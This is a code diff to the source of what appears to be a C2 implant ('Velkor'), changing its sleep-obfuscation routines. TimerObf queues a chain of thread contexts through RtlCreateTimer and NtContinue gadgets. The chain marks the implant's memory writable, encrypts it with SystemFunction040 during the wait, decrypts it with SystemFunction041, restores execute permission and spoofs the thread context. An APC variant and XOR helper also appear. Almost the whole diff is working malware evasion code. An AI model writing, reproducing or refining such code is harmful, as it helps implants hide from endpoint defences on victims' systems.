@@ -1,7 +1,7 @@
 #include <Ground.h>
 #include <Evasion.h>
 
-VOID XorCipher( PBYTE pBinary, SIZE_T sSize, PBYTE pbKey, SIZE_T sKeySize ) {
+D_SEC( B ) VOID XorCipher( PBYTE pBinary, SIZE_T sSize, PBYTE pbKey, SIZE_T sKeySize ) {
     for ( SIZE_T i = 0x00, j = 0x00; i < sSize; i++, j++ ) {
         if ( j == sKeySize )
             j = 0x00;
@@ -19,11 +19,11 @@ D_SEC( B ) VOID SleepMain(
     VELKOR_INSTANCE
         TimerObf( SleepTime );
     return;
-    if ( SleepConf.SleepTime == 1 || SleepConf.SleepTime == 0  || SleepConf.SleepTechnique == VelkorNtWait ) {
-        VkCall<ULONG>( XprKernel32, XPR( "WaitForSingleObjectEx" ), NtCurrentProcess(), SleepTime, FALSE );
-    } else if ( SleepConf.SleepTechnique == VelkorTimer ) {
+    if ( SleepConf.SleepTime == 1 || SleepConf.SleepTime == 0  || SleepConf.SleepMask == VkMaskWait ) {
+        VkCall<ULONG>( XprKernel32, XPR( "WaitForSingleObject" ), NtCurrentProcess(), SleepTime );
+    } else if ( SleepConf.SleepMask == VkMaskTimer ) {
         TimerObf( SleepTime );
-    } else if ( SleepConf.SleepTechnique == VelkorApc ) {
+    } else if ( SleepConf.SleepMask == VkMaskApc ) {
         ApcObf( SleepTime );
     }
 
@@ -38,7 +38,7 @@ D_SEC( B ) VOID TimerObf(
 
     NTSTATUS NtStatus = 0;
     
-    UINT32 DupThreadId      = VkThread::Enum();
+    UINT32 DupThreadId      = VkThread::RndEnum();
     HANDLE DupThreadHandle  = NULL;
     HANDLE MainThreadHandle = NULL;
 
@@ -47,17 +47,6 @@ D_SEC( B ) VOID TimerObf(
     HANDLE EventTimer  = NULL;
     HANDLE EventStart  = NULL;
     HANDLE EventEnd    = NULL;
-
-    PVOID SleepJmpGadgetPtr        = SleepConf.JmpGadget;
-    PVOID NtContinueGadgetPtr      = SleepConf.NtContinueGadget;
-    PVOID NtGetContextThreadPtr    = FuncPtr.NtGetContextThread;
-    PVOID NtSetContextThreadPtr    = FuncPtr.NtSetContextThread;
-    PVOID NtWaitForSingleObjectPtr = FuncPtr.NtWaitForSingleObject;
-    PVOID WaitForSingleObjectExPtr = FuncPtr.WaitForSingleObjectEx;
-    PVOID SystemFunction040Ptr     = FuncPtr.SystemFunction040;
-    PVOID SystemFunction041Ptr     = FuncPtr.SystemFunction041;
-    PVOID VirtualProtectPtr        = FuncPtr.VirtualProtect;
-    PVOID SetEventPtr              = FuncPtr.SetEvent;
 
     PVOID OldProtection = NULL;
     ULONG DelayTimer    = 0;
@@ -110,68 +99,68 @@ D_SEC( B ) VOID TimerObf(
         Ctx[i].Rsp -= sizeof( PVOID );
     }
 
-    Ctx[ic].Rip = U_64( SleepJmpGadgetPtr );
-    Ctx[ic].Rbx = U_64( &NtWaitForSingleObjectPtr );
+    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
+    Ctx[ic].Rbx = U_64( &FuncPtr.NtWaitForSingleObject );
     Ctx[ic].Rcx = U_64( EventStart );
     Ctx[ic].Rdx = FALSE;
     Ctx[ic].R9  = NULL;
     ic++;
 
-    Ctx[ic].Rip = U_64( SleepJmpGadgetPtr );
-    Ctx[ic].Rbx = U_64( &NtGetContextThreadPtr );
+    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
+    Ctx[ic].Rbx = U_64( &FuncPtr.NtGetContextThread );
     Ctx[ic].Rcx = U_64( MainThreadHandle );
     Ctx[ic].Rdx = U_64( &CtxBkp );
     ic++;
 
-    Ctx[ic].Rip = U_64( SleepJmpGadgetPtr ) ;
-    Ctx[ic].Rbx = U_64( &NtSetContextThreadPtr ); 
+    Ctx[ic].Rip = U_64( SleepConf.JmpGadget ) ;
+    Ctx[ic].Rbx = U_64( &FuncPtr.NtSetContextThread ); 
     Ctx[ic].Rcx = U_64( MainThreadHandle );
     Ctx[ic].Rdx = U_64( &CtxSpf );
     ic++;
 
-    Ctx[ic].Rip = U_64( SleepJmpGadgetPtr );
-    Ctx[ic].Rbx = U_64( &VirtualProtectPtr );
+    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
+    Ctx[ic].Rbx = U_64( &FuncPtr.VirtualProtect );
     Ctx[ic].Rcx = U_64( VelkorMem.RxPage.Start );
     Ctx[ic].Rdx = VelkorMem.RxPage.Length;
     Ctx[ic].R8  = PAGE_READWRITE;
     Ctx[ic].R9  = U_64( &OldProtection );
     ic++;
 
-    Ctx[ic].Rip = U_64( SleepJmpGadgetPtr );
-    Ctx[ic].Rbx = U_64( &SystemFunction040Ptr );
+    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
+    Ctx[ic].Rbx = U_64( &FuncPtr.SystemFunction040 );
     Ctx[ic].Rcx = U_64( VelkorMem.Full.Start );
     Ctx[ic].Rdx = VelkorMem.Full.Length;
     ic++;
     
-    Ctx[ic].Rip = U_64( SleepJmpGadgetPtr );
-    Ctx[ic].Rbx = U_64( &WaitForSingleObjectExPtr );
+    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
+    Ctx[ic].Rbx = U_64( &FuncPtr.WaitForSingleObjectEx );
     Ctx[ic].Rcx = U_64( NtCurrentProcess() );
     Ctx[ic].Rdx = SleepTime;
     Ctx[ic].R8  = FALSE;
     ic++;
         
-    Ctx[ic].Rip = U_64( SleepJmpGadgetPtr );
-    Ctx[ic].Rbx = U_64( &SystemFunction041Ptr );
+    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
+    Ctx[ic].Rbx = U_64( &FuncPtr.SystemFunction041 );
     Ctx[ic].Rcx = U_64( VelkorMem.Full.Start );
     Ctx[ic].Rdx = VelkorMem.Full.Length;
     ic++;
 
-    Ctx[ic].Rip = U_64( SleepJmpGadgetPtr );
-    Ctx[ic].Rbx = U_64( &VirtualProtectPtr );
+    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
+    Ctx[ic].Rbx = U_64( &FuncPtr.VirtualProtect );
     Ctx[ic].Rcx = U_64( VelkorMem.RxPage.Start );
     Ctx[ic].Rdx = VelkorMem.RxPage.Length;
     Ctx[ic].R8  = PAGE_EXECUTE_READ;
     Ctx[ic].R9  = U_64( &OldProtection );
     ic++;
 
-    Ctx[ic].Rip = U_64( SleepJmpGadgetPtr );
-    Ctx[ic].Rbx = U_64( &NtSetContextThreadPtr );
+    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
+    Ctx[ic].Rbx = U_64( &FuncPtr.NtSetContextThread );
     Ctx[ic].Rcx = U_64( MainThreadHandle );
     Ctx[ic].Rdx = U_64( &CtxBkp );
     ic++;
 
-    Ctx[ic].Rip = U_64( SleepJmpGadgetPtr );
-    Ctx[ic].Rbx = U_64( &SetEventPtr );
+    Ctx[ic].Rip = U_64( SleepConf.JmpGadget );
+    Ctx[ic].Rbx = U_64( &FuncPtr.SetEvent );
     Ctx[ic].Rcx = U_64( EventEnd );
     ic++;
 
@@ -180,13 +169,13 @@ D_SEC( B ) VOID TimerObf(
         Key[i] = (BYTE)Random32();
     }    
 
-    VkMem::Heap::HeapCrypt( Key, sizeof( Key ) );
+    // VkMem::Heap::HeapCrypt( Key, sizeof( Key ) );
 
     for ( INT i = 0; i < ic; i++ ) {
-        VkCall<VOID>( XprNtdll, XPR( "RtlCreateTimer" ), Queue, &Timer, NtContinueGadgetPtr, &Ctx[i], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
+        VkCall<VOID>( XprNtdll, XPR( "RtlCreateTimer" ), Queue, &Timer, SleepConf.NtContinueGadget, &Ctx[i], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
     }
 
-    VkMem::Heap::HeapCrypt( Key, sizeof( Key ) );
+    // VkMem::Heap::HeapCrypt( Key, sizeof( Key ) );
 
     VkShow( "{OBF} Trigger obf chain\n\n" );
 
@@ -213,7 +202,7 @@ D_SEC( B ) VOID ApcObf(
 
     NTSTATUS NtStatus = STATUS_SUCCESS;
 
-    ULONG  DupThreadId      = VkThread::Enum();
+    ULONG  DupThreadId      = VkThread::RndEnum();
     HANDLE DupThreadHandle  = NULL;
     HANDLE MainThreadHandle = NULL;
 
